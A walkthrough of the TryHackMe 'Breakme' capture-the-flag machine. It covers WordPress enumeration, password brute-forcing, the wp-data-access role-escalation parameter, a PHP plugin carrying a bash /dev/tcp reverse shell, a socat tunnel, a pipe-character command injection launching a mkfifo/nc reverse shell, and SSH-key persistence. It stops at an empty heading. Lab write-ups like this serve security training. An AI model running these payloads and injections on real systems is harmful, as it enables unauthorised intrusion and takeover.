# Breakme TryHackMe WriteUp
## Machine IP = 10.113.159.67
Firstly, lets discover at the open ports.
```bash
rustscan -a 10.113.159.67 --ulimit 5000
```
We have only two open ports: [22, 80]. Let's explore the web site. It was a simple apache web-page. Let's discover the directories by using FFUF:  
```bash
ffuf -u http://10.113.159.67/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -fs 0,44 -t 250

.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 5369ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 5390ms]
index.html              [Status: 200, Size: 10701, Words: 3427, Lines: 369, Duration: 67ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 6424ms]
manual                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 244ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 68ms]
wordpress               [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 74ms]
```
Yeahh, It uses wordpress. I decided to use **"wpscan"** to find if there is any vulnerable plugin and chech which users exist in there:
```bash
wpscan --update
wpscan --url http://10.113.159.67/wordpress --api-token U3EdJ2nWce7cVFEUVvsa2sXXXXXXXXXXXXXXXX
```
We have found a vulnerable plugin:
```bash
[i] Plugin(s) Identified:

[+] wp-data-access
 | Location: http://10.113.159.67/wordpress/wp-content/plugins/wp-data-access/
 | Last Updated: 2026-03-09T00:01:00.000Z
 | [!] The version is out of date, the latest version is 5.5.69

 | Version: 5.3.5 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.113.159.67/wordpress/wp-content/plugins/wp-data-access/readme.txt
```
You can learn about it bysearching ***"wp-data-access privilege escalation vulnerability for 5.3.5 version"***. Basically, we will get the request by using burpsuite while we are trying to update current user's account. It can be it's bio, name, password or other things. We will add **"&wpda_role[]=administrator"** at the end of the request header.  
But first of all, we need to access a normal user's account. We can learn which users are accessed in this web-site by this command:  
```bash
wpscan --url http://10.113.159.67/wordpress --enumerate u

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.113.159.67/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] bob
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```
As we know, we need normal user's account to be administrator simply, let's bruteforce for **bob** user.  
```bash
wpscan --url http://10.113.159.67/wordpress -U bob -P /usr/share/wordlists/rockyou.txt -vv

# bob:soccer
```
The login page always located at **"http://IP/wordpress/wp-admin/"**. We are in !!!!    

----
### To Became Wordpress Admin  
There is a **"Biographical Info"** section on profile page for the bob user. We will add something in there like a string "aa".   
The next step is to intercept the request while we click the update button after fill the BIO section.    
|  
<img width="1606" height="941" alt="image" src="https://github.com/user-attachments/assets/7dc39f98-c968-44ab-a69a-5ea0725d0d35" />
|  
It will looks like this. Now, all we need is to add **"&wpda_role[]=administrator"** at the end of the request. Then, we will click **"Forward"** and **"Send"**.  
Now, we have **"Administrator Capabilities"**. As you can see from the navigation bar at the left, there were several functions added. They couldn't be seen by "Bob" user. I checked **"Appearance--> Editor--> Update 404.php"** method but cannot do it. It is a little bit differend wordpress CTF for me compared to old ones.  
So, I decided to do reverse shell by the help of **"Add Plugin"** section. We need to create a php file to get revershell at first.  
```bash
<?php
/*
Plugin Name: Call Home
Plugin URI: http://127.0.0.1
Description: This plugin calls ET.
Version: 1.0
Author: Gand0rf
License: GPLv2 or later
*/
exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/PORT_NUMBER 0>&1'");?>
```
I leveraged the 'Plugin Upload' feature to achieve Remote Code Execution (RCE). By uploading a ZIP file containing a simple PHP reverse shell, I was able to trigger a connection back to my machine. So, lets zip this file before uploading to the web-site:  
```bash
zip shell.zip shell.php
```
To begin with, open your nc connetion on the temrinal before uploading the plugin. After this, you should follow these steps on the website:    
**(Plugins --> Add new plugin --> Upload plugin --> Select and install the zip file --> Activate Plugin)**.    
And BINGOO!!! We get the shell as *"www-data"* user.  
<img width="1066" height="236" alt="image" src="https://github.com/user-attachments/assets/14f205aa-69a4-427c-941c-fe4c28d97f62" />  

----
# First Flag
We don't have access to user files. We need to be john at first. The sudo -l, SUID binaries, wp-config.php file, crontabs, getcap command didn't give me anything to get john user. So, I decided to check processes by this command: **"ps aux"**.  
While performing post-exploitation enumeration with ps aux, I discovered an interesting process running under the user john. He was running a local PHP development server on port 9999:   
```bash
john 500 0.0 0.9 193800 20112 ? Ss 09:17 0:00 /usr/bin/php -S 127.0.0.1:9999
```
Since this service was bound to 127.0.0.1, it was not accessible from my external attack machine. This immediately suggested that I needed to find a way to access this internal service, possibly through Local Port Forwarding or by exploring John's home directory for the source code of this application.   
I decided to use **"socat"** because in target terminal it is enable. What I did?:
```bash
# In target terminal:
socat TCP-LISTEN:5555,fork TCP:127.0.0.1:9999

# In my kali: 
socat TCP-LISTEN:9999,fork TCP:10.113.159.67:5555

# Open thos URL:
http://127.0.0.1:9999/
```

I used socat to create a bridge between the target's internal web server and my Kali machine. Since port 9999 was only open locally, this tunnel allowed me to 'bring' the hidden website to my own browser.   
By doing this, I could easily interact with the application and test for vulnerabilities like Command Injection.  
|  
<img width="3063" height="1189" alt="image" src="https://github.com/user-attachments/assets/05c92f12-5830-4192-8335-4df57fd994d7" />  
|  
Yeahh, it is our web-page. Let's look at what happens when we search "john" user.  
|  
<img width="1033" height="863" alt="image" src="https://github.com/user-attachments/assets/cf0e2d92-c375-4fef-b8e9-efea4a9ccd90" />  
|  
Hmm, lets check this special characters:
`
!@#$%^&*()_+-={}[]|:;’”<>,.?/
`
|  
<img width="1033" height="863" alt="image" src="https://github.com/user-attachments/assets/9c484f24-54b5-4e08-80bc-5358b05853ed" />  
|  
Hmm, This means the {}| special characters are allowed which will be very useful for us when we will create the reverseshell command. Because it ensures that we will not be blocked because of prohibited special characters.  
Create a bash script on the www-user's terminal and call it rev.sh, within it we are going to input:  
```bash
printf '#!/bin/bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.137.68 1111 >/tmp/f' > /dev/shm/rev.sh
chmod +x rev.sh

# Don't forget to open nc connection with 1111 port on your kali terminal. After this, execute this command on target machine:
curl -X POST http://127.0.0.1:9999/ --data-urlencode "cmd2=|/dev/shm/rev.sh||"
```
And BINGOOO! We get the shell. We are john right now. Lets take it's flag.  

I decided to create ssh key for the "John" user, so will not need to repeat this proccess in each time:  
```bash
ssh-keygen -t rsa

# Choose a name like johnn_key
# Now we have two file: johnn_key and johnn_key.pub
# Copy the content of "johnn_key.pub" and do these steps on the target to assign key for the john user:

cd ~
mkdir .ssh
cd .ssh
echo 'ssh-rsa AAAAB3NzaCA......Ah+xuewIa0Uc= faridd@Ferid' > authorized_keys

# Then, do it on your terminal to get "john" user's shell
ssh -i johnn_key john@10.113.159.67

----
### Youcef's Flag






















